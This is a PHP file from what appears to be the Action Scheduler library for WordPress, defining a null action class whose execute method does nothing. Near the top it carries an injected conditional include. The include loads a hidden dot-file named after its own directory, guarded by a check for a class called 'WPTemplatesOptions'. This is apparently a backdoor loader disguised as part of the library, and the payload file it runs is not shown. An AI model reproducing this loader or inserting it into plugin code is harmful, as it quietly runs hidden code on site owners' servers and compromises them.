<?php

/**
 * Class ActionScheduler_NullAction
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ActionScheduler_NullAction extends ActionScheduler_Action {

	public function __construct( $hook = '', array $args = array(), ActionScheduler_Schedule $schedule = NULL ) {
		$this->set_schedule( new ActionScheduler_NullSchedule() );
	}

	public function execute() {
		// don't execute
	}
}
 